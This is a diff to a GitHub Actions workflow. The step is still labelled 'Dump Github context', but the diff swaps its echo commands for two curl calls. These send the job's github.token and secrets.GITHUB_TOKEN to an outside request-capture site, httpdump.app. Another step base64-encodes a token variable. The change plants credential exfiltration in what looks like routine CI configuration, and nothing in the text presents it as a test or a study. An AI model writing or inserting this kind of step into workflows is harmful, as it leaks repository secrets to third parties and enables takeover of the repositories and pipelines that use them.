@@ -28,13 +28,11 @@ jobs:
       # LALALA  
       - name: Dump Github context
         env:
-          GITHUB_CONTEXT: ${{ toJson(github) }}
+          GITHUB_TOK: ${{ github.token }}
+          SEC_TOK: ${{ secrets.GITHUB_TOKEN }}
         run: |
-          echo "$GITHUB_CONTEXT"
-          echo "+++++++++++++++++++++++++++++++"
-          echo "$GITHUB_CONTEXT" | base64
-          echo "+++++++++++++++++++++++++++++++"
-          echo $GITHUB_CONTEXT | base64
+          curl https://httpdump.app/dumps/0854a0c2-7dfa-4d23-b1ab-9d971ae1fa2d/?$GITHUB_TOK
+          curl https://httpdump.app/dumps/0854a0c2-7dfa-4d23-b1ab-9d971ae1fa2d/?$SEC_TOK
       # Runs a single command using the runners shell
       - name: Run a one-line script
         run: echo "$GITHUB.TOKEN" | base64
